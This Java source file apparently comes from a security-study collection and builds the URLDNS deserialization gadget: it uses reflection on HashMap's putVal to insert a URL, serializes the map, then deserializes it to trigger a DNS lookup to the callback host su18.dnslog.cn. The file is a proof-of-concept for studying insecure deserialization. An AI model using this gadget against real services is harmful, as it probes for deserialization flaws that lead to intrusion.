package com.anbai.sec.serializes.URLDNS;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;

public class URLDNS2 {
    public static void main(String[] args) throws Exception {

        HashMap<URL, Integer> hashMap = new HashMap<>();
        URL                   url     = new URL("http://su18.dnslog.cn");

        Method[] m = Class.forName("java.util.HashMap").getDeclaredMethods();
        for (Method method : m) {
            if (method.getName().equals("putVal")) {
                method.setAccessible(true);
                method.invoke(hashMap, -1, url, 0, false, true);
            }
        }

        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("urldns2.bin"));
        oos.writeObject(hashMap);
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("urldns2.bin"));
        ois.readObject();
    }
}
